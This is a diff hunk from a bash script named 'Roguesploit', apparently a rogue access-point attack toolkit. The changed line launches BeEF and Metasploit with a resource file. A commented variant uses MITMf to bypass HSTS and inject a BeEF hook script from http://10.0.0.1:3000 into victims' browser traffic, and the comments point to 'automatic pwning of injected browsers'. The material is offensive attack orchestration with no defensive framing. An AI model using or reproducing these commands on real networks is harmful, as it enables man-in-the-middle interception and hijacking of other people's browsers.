@@ -1589,7 +1589,7 @@ beef:
 EOF
 	sleep 0.6
 	echo -e $blue"["$red"!"$blue"]"$white" Starting Roguesploit Pwning! "$blue"["$red"!"$blue"]"
-	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh" & sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i $interf --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" # if you enable this method, please delete this ^" term -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" ^ or you'll have problems :D
+	rogueon && echo -e $blue"["$red"!"$blue"]"$white" MITMF will load after 20 sec to permit BeEF to load everything!"$blue"["$red"!"$blue"]" & xterm -title "BeEF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1 -e "bash BeEFStarter.sh" &  xterm -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" #sleep 20 && xterm -title "MITMF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25-1 -e "sudo mitmf -i $interf --hsts --inject --js-url "http://10.0.0.1:3000/hook.js"" # if you enable this method, please delete this ^"xterm -title "MSF" -bg "#000000" -fg "#FFFFFF" -geometry 100x25+1-1 -e "sudo msfconsole -r roguepwn3.rc" ^ or you'll have problems :D
 #enable this instead of starting msf captive portal, but you'll need an internet connection and enable line 114. Add "--browsersniper" if you want to enable automatic pwning of injected browsers;
 #but you need to change some other option to enable correctly the metasploit method too;
 # MSF Beef config: "auto_msfrpcd: false" to "auto_msfrpcd: true"
